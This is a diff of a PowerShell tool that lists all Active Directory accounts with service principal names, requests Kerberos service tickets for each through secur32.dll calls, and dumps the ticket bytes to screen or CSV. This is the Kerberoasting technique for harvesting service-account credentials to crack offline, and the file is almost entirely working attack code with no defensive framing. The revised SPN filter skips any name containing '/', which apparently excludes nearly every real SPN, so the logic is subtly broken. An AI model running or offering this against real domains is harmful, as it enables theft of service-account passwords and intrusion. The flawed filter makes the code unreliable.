@@ -1,178 +1,160 @@
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-
-public class K {
-    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-    public static extern int AcquireCredentialsHandle(
-        string pszPrincipal,
-        string pszPackage,
-        uint fCredentialUse,
-        IntPtr pvLogonID,
-        IntPtr pAuthData,
-        IntPtr pGetKeyFn,
-        IntPtr pvGetKeyArgument,
-        out IntPtr phCredential,
-        out IntPtr ptsExpiry);
-
-    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-    public static extern int InitializeSecurityContext(
-        IntPtr phCredential,
-        IntPtr phContext,
-        string pszTargetName,
-        uint fContextReq,
-        uint Reserved1,
-        uint TargetDataRep,
-        IntPtr pInput,
-        uint Reserved2,
-        out IntPtr phNewContext,
-        out SecBufferDesc pOutput,
-        out uint pfContextAttr,
-        out IntPtr ptsExpiry);
-
-    [DllImport("secur32.dll", SetLastError = true)]
-    public static extern int FreeCredentialsHandle(IntPtr phCredential);
-
-    [DllImport("secur32.dll", SetLastError = true)]
-    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct SecBuffer {
-        public uint cbBuffer;
-        public uint BufferType;
-        public IntPtr pvBuffer;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct SecBufferDesc {
-        public uint ulVersion;
-        public uint cBuffers;
-        public IntPtr pBuffers;
-    }
-
-    public static string GetTicket(string spn) {
-        IntPtr cred = IntPtr.Zero;
-        IntPtr ctx = IntPtr.Zero;
-        IntPtr expiry1 = IntPtr.Zero;
-        IntPtr expiry2 = IntPtr.Zero;
-        IntPtr bufPtr = IntPtr.Zero;
-        uint attr = 0;
-
-        SecBuffer secBuf = new SecBuffer();
-        secBuf.BufferType = 2; // SECBUFFER_TOKEN
-        secBuf.cbBuffer = 0;
-        secBuf.pvBuffer = IntPtr.Zero;
-
-        try {
-            bufPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SecBuffer)));
-            Marshal.StructureToPtr(secBuf, bufPtr, false);
-
-            SecBufferDesc desc = new SecBufferDesc();
-            desc.ulVersion = 0;
-            desc.cBuffers = 1;
-            desc.pBuffers = bufPtr;
-
-            if (AcquireCredentialsHandle(
-                    null,
-                    "Kerberos",
-                    0x00000002,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    out cred,
-                    out expiry1) != 0)
-                return "";
-
-            if (InitializeSecurityContext(
-                    cred,
-                    IntPtr.Zero,
-                    spn,
-                    0x00001000,
-                    0,
-                    16,
-                    IntPtr.Zero,
-                    0,
-                    out ctx,
-                    out desc,
-                    out attr,
-                    out expiry2) != 0)
-                return "";
-
-            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(desc.pBuffers, typeof(SecBuffer));
-            if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
-                return "";
-
-            byte[] data = new byte[resultBuf.cbBuffer];
-            Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
-            return BitConverter.ToString(data).Replace("-", "");
-        } finally {
-            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
-            if (bufPtr != IntPtr.Zero) {
-                try {
-                    SecBuffer cleanup = (SecBuffer)Marshal.PtrToStructure(bufPtr, typeof(SecBuffer));
-                    if (cleanup.pvBuffer != IntPtr.Zero) FreeContextBuffer(cleanup.pvBuffer);
-                } catch { }
-                Marshal.FreeHGlobal(bufPtr);
-            }
-        }
-    }
-}
-"@
-
 function Get-KerberosTicketsForAllSPNs {
-    param (
+    param(
         [switch]$ExportToCsv
     )
 
-    Write-Host "`nRequesting TGS for SPNs:`n" -ForegroundColor Cyan
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
 
-    try {
-        $results = Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName, SamAccountName
-    } catch {
-        Write-Error "Failed to query Active Directory. Ensure RSAT tools are installed and you are authenticated."
-        return
-    }
+    public class K {
+        [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern int AcquireCredentialsHandle(
+            string pszPrincipal,
+            string pszPackage,
+            uint fCredentialUse,
+            IntPtr pvLogonID,
+            IntPtr pAuthData,
+            IntPtr pGetKeyFn,
+            IntPtr pvGetKeyArgument,
+            out IntPtr phCredential,
+            out IntPtr ptsExpiry);
 
-    $output = @()
+        [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern int InitializeSecurityContext(
+            ref IntPtr phCredential,
+            IntPtr phContext,
+            string pszTargetName,
+            uint fContextReq,
+            uint Reserved1,
+            uint TargetDataRep,
+            IntPtr pInput,
+            uint Reserved2,
+            out IntPtr phNewContext,
+            ref SecBufferDesc pOutput,
+            out uint pfContextAttr,
+            out IntPtr ptsExpiry);
 
-    foreach ($r in $results) {
-        foreach ($spn in $r.ServicePrincipalName) {
+        [DllImport("secur32.dll", SetLastError = true)]
+        public static extern int FreeCredentialsHandle(IntPtr phCredential);
 
-            # Skip known unsafe SPNs
-            if ($spn -match "^kadmin/changepw") {
-                Write-Warning "Skipping unstable SPN: ${spn}"
-                continue
-            }
+        [DllImport("secur32.dll", SetLastError = true)]
+        public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
 
-            Write-Host "  → ${spn}" -ForegroundColor Yellow
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SecBuffer {
+            public uint cbBuffer;
+            public uint BufferType;
+            public IntPtr pvBuffer;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SecBufferDesc {
+            public uint ulVersion;
+            public uint cBuffers;
+            public IntPtr pBuffers;
+        }
+
+        public static string GetTicket(string spn) {
+            IntPtr cred = IntPtr.Zero;
+            IntPtr ctx = IntPtr.Zero;
+            IntPtr expiry1 = IntPtr.Zero;
+            IntPtr expiry2 = IntPtr.Zero;
+            IntPtr bufPtr = IntPtr.Zero;
+            uint attr = 0;
+
+            SecBuffer secBuf = new SecBuffer();
+            secBuf.BufferType = 2; // SECBUFFER_TOKEN
+            secBuf.cbBuffer = 0;
+            secBuf.pvBuffer = IntPtr.Zero;
 
             try {
-                $ticket = [K]::GetTicket($spn)
-                if ($ticket) {
-                    $output += [pscustomobject]@{
-                        User            = $r.SamAccountName
-                        SPN             = $spn
-                        TicketHex       = $ticket
-                    }
-                } else {
-                    Write-Warning "No ticket received for ${spn}"
+                bufPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SecBuffer)));
+                Marshal.StructureToPtr(secBuf, bufPtr, false);
+
+                SecBufferDesc desc = new SecBufferDesc();
+                desc.ulVersion = 0;
+                desc.cBuffers = 1;
+                desc.pBuffers = bufPtr;
+
+                if (AcquireCredentialsHandle(
+                        null,
+                        "Kerberos",
+                        0x00000002,
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        out cred,
+                        out expiry1) != 0)
+                    return "";
+
+                if (InitializeSecurityContext(
+                        ref cred,
+                        IntPtr.Zero,
+                        spn,
+                        0x00001000,
+                        0,
+                        16,
+                        IntPtr.Zero,
+                        0,
+                        out ctx,
+                        ref desc,
+                        out attr,
+                        out expiry2) != 0)
+                    return "";
+
+                SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(desc.pBuffers, typeof(SecBuffer));
+                if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
+                    return "";
+
+                byte[] data = new byte[resultBuf.cbBuffer];
+                Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
+                return BitConverter.ToString(data).Replace("-", "");
+            } finally {
+                if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
+                if (bufPtr != IntPtr.Zero) {
+                    try {
+                        SecBuffer cleanup = (SecBuffer)Marshal.PtrToStructure(bufPtr, typeof(SecBuffer));
+                        if (cleanup.pvBuffer != IntPtr.Zero) FreeContextBuffer(cleanup.pvBuffer);
+                    } catch { }
+                    Marshal.FreeHGlobal(bufPtr);
                 }
-            } catch [System.AccessViolationException] {
-                Write-Warning "AccessViolationException: Unstable memory for SPN ${spn}. Skipping."
-            } catch {
-                Write-Warning ("Failed to request ticket for SPN `"${spn}`": " + $_.Exception.Message)
             }
         }
     }
+"@
 
-    if ($ExportToCsv -and $output.Count -gt 0) {
-        $csv = "kerberos_tickets_$(Get-Date -Format yyyyMMdd_HHmmss).csv"
-        $output | Export-Csv -Path $csv -NoTypeInformation -Encoding UTF8
-        Write-Host "`nExported results to $csv" -ForegroundColor Green
-    } elseif ($output.Count -eq 0) {
-        Write-Warning "`nNo tickets collected."
+    $spns = Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object { $_.ServicePrincipalName } | ForEach-Object { $_.ServicePrincipalName } | Select-Object -Unique
+    Write-Host "`nRequesting TGS for SPNs:`n" -ForegroundColor Cyan
+
+    $results = @()
+
+    foreach ($spn in $spns) {
+        if ($spn -match '[^\x20-\x7E]|\$|/|\\') {
+            Write-Warning "Skipping unstable SPN: ${spn}"
+            continue
+        }
+        try {
+            $ticket = [K]::GetTicket($spn)
+            if ($ticket) {
+                $results += [PSCustomObject]@{
+                    SPN = $spn
+                    Ticket = $ticket
+                }
+            }
+        } catch {
+            Write-Warning ("Failed to request ticket for ${spn}: " + $_)
+        }
+    }
+
+    if ($ExportToCsv -and $results.Count -gt 0) {
+        $results | Export-Csv -Path KerberosTickets.csv -NoTypeInformation
+        Write-Host "`nExported to KerberosTickets.csv" -ForegroundColor Green
     } else {
-        $output | Format-Table -AutoSize
+        $results | Format-Table -AutoSize
     }
 }
+
+# Example usage:
+# Get-KerberosTicketsForAllSPNs -ExportToCsv
